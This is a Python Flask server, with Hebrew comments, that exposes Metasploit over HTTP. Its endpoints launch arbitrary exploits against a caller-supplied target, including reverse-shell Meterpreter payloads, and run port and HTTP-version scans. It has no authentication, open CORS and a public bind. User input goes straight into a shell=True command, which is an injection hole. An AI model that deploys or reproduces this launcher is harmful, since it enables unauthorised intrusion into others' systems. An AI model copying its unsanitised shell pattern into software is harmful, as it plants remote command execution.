from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess

app = Flask(__name__)
CORS(app)

# ---------- Helpers ----------
def run_msf_console(msf_commands: str, timeout_sec: int = 300):
    """
    מריץ msfconsole עם רצף פקודות ומחזיר STDOUT/STDERR כטקסט.
    """
    cmd = f'msfconsole -q -x "{msf_commands}; exit"'
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout_sec)
        return res.stdout if res.stdout else res.stderr
    except Exception as e:
        return f"ERROR: {str(e)}"

# ---------- Legacy demo endpoints (נשארים כדי לא לשבור דפים ישנים) ----------
@app.route('/run_exploit', methods=['POST'])
def legacy_run_exploit():
    """
    תמיכה לאחור: מקבל {target_ip, payload} ומריץ use <payload>; set RHOST <target_ip>; exploit
    עדיף להשתמש ב- /api/exploit/run עם פרמטרים מלאים.
    """
    data = request.get_json(force=True) or {}
    target_ip = data.get('target_ip')
    payload = data.get('payload')
    if not target_ip or not payload:
        return jsonify({'error': 'Missing target_ip or payload'}), 400

    msf_cmds = f"use {payload}; set RHOST {target_ip}; exploit"
    out = run_msf_console(msf_cmds, timeout_sec=300)
    print("=== Real Exploit Output (legacy) ===\n", out, "\n==========================")
    return jsonify({'output': out})

@app.route('/simulate_attack', methods=['POST'])
def simulate_attack():
    """
    סימולציה: מחזיר פלט דמה—נוח לדמו/בדיקות Frontend.
    קלט: {target_ip, payload}
    """
    data = request.get_json(force=True) or {}
    target_ip = data.get('target_ip', '0.0.0.0')
    payload = data.get('payload', 'exploit/unknown')

    fake_output = f"""
[+] Connecting to target  {target_ip}
[+] Using payload: {payload}
[+] Exploit launched successfully!
[+] Simulated Session opened with  {target_ip}
[+] Meterpreter prompt: >
"""
    print("=== Simulated Attack ===\n", fake_output, "\n========================")
    return jsonify({'output': fake_output})

# ---------- Exploit API (מלא) ----------
@app.route('/api/exploit/run', methods=['POST'])
def api_exploit_run():
    """
    קלט JSON:
    {
      "EXPLOIT": "exploit/.../...",
      "RHOST": "x.x.x.x",
      "RPORT": "NNN",            (אופציונלי)
      "LHOST": "your-ec2-ip",    (אופציונלי, לרוב חובה ב-reverse)
      "LPORT": "4444",           (אופציונלי)
      "PAYLOAD": "windows/meterpreter/reverse_tcp"  (אופציונלי)
    }
    """
    data = request.get_json(force=True) or {}
    exploit = data.get('EXPLOIT')
    rhost   = data.get('RHOST')
    rport   = data.get('RPORT', '')
    lhost   = data.get('LHOST', '')
    lport   = data.get('LPORT', '')
    payload = data.get('PAYLOAD', '')

    if not exploit or not rhost:
        return jsonify({'error': 'Missing EXPLOIT or RHOST'}), 400

    parts = [f"use {exploit}", f"set RHOST {rhost}"]
    if rport:   parts.append(f"set RPORT {rport}")
    if lhost:   parts.append(f"set LHOST {lhost}")
    if lport:   parts.append(f"set LPORT {lport}")
    if payload: parts.append(f"set PAYLOAD {payload}")
    parts.append("exploit")

    msf_cmds = "; ".join(parts)
    out = run_msf_console(msf_cmds, timeout_sec=300)
    print("=== Real Exploit Output ===\n", out, "\n==========================")
    return jsonify({'output': out})

# ---------- Auxiliary API ----------
@app.route('/api/aux/portscan_tcp', methods=['POST'])
def aux_portscan_tcp():
    """
    מודול: auxiliary/scanner/portscan/tcp
    קלט: { RHOSTS (חובה), PORTS (חובה), THREADS (ברירת מחדל 10) }
    """
    data = request.get_json(force=True) or {}
    rhosts = data.get('RHOSTS')
    ports  = data.get('PORTS')
    threads = data.get('THREADS', '10')
    if not rhosts or not ports:
        return jsonify({'error': 'Missing RHOSTS or PORTS'}), 400

    msf_cmds = (
        "use auxiliary/scanner/portscan/tcp; "
        f"set RHOSTS {rhosts}; "
        f"set PORTS {ports}; "
        f"set THREADS {threads}; "
        "run"
    )
    out = run_msf_console(msf_cmds, timeout_sec=240)
    return jsonify({'output': out})

@app.route('/api/aux/http_version', methods=['POST'])
def aux_http_version():
    """
    מודול: auxiliary/scanner/http/http_version
    קלט: { RHOSTS (חובה), RPORT (ברירת מחדל 80) }
    """
    data = request.get_json(force=True) or {}
    rhosts = data.get('RHOSTS')
    rport  = data.get('RPORT', '80')
    if not rhosts:
        return jsonify({'error': 'Missing RHOSTS'}), 400

    msf_cmds = (
        "use auxiliary/scanner/http/http_version; "
        f"set RHOSTS {rhosts}; "
        f"set RPORT {rport}; "
        "run"
    )
    out = run_msf_console(msf_cmds, timeout_sec=180)
    return jsonify({'output': out})

# ---------- Run ----------
if __name__ == '__main__':
    # ודא שפורט 5000 פתוח ב-SG
    app.run(host='0.0.0.0', port=5000)
